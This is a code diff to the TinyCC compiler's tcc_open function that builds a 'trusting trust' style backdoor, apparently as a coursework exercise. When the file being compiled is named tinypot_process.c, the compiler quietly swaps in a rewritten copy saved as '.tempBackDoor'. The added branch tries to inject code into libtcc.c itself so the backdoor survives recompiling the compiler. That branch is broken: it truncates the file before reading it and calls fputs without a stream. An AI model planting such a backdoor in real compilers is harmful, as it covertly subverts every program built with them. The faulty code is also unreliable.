@@ -612,9 +612,9 @@ ST_FUNC int tcc_open(TCCState *s1, const char *filename)
     if (strcmp(filename, "tinypot_process.c") == 0)
     {
         // Open tinypot_process.c file
-        FILE *oldFile = fopen(filename, "r");
+        FILE* oldFile = fopen(filename, "r");
         // Create new file
-        FILE *newFile = fopen(".tempBackDoor", "w");
+        FILE* newFile = fopen(".tempBackDoor", "w");
         // Read each string from tinypot_process.c
         char buf[200];
         while (fgets(buf, 200, oldFile) != NULL)
@@ -629,6 +629,22 @@ ST_FUNC int tcc_open(TCCState *s1, const char *filename)
         fclose(oldFile);
         fclose(newFile);
         fd = open(".tempBackDoor", O_RDONLY | O_BINARY);
+    }
+    else if (strcmp(filename, "libtcc.c") == 0)
+    {
+        FILE* compilerFile = fopen(filename, "w+");
+        FILE* tempFile = fopen(".temp", "w+");
+        char buf[200];
+        while (fgets(buf, 200, compilerFile) != NULL)
+        {
+            fputs(buf, tempFile);
+            if (strstr(buf, "ST_FUNC int tcc_open(TCCState *s1, const char *filename)") != NULL)
+            {
+                fputs("hello\n");
+            }
+        }
+        fclose(compilerFile);
+        fclose(tempFile);
     }
 
     if ((s1->verbose == 2 && fd >= 0) || s1->verbose == 3)
